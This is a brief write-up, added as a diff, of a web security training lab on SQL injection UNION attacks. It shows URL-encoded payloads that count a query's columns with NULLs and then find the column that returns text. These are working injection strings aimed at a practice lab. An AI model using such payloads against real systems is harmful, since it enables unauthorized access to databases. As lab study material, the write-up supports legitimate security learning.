@@ -1,0 +1,13 @@
+SQL injection UNION attack, finding a column containing text
+
+Building up on the previous lab, we can start by finding out how many columns we're dealing with:
+
+https://ac6a1f6b1fcc255a80832fb000df00df.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL,NULL--
+
+Now start iterating through the NULLs with the text provided to find the column containing text.
+
+https://ac6a1f6b1fcc255a80832fb000df00df.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27NoOc7D%27,NULL--
+
+Payload without encoding:
+
+'+UNION+SELECT+NULL,'NoOc7D',NULL--
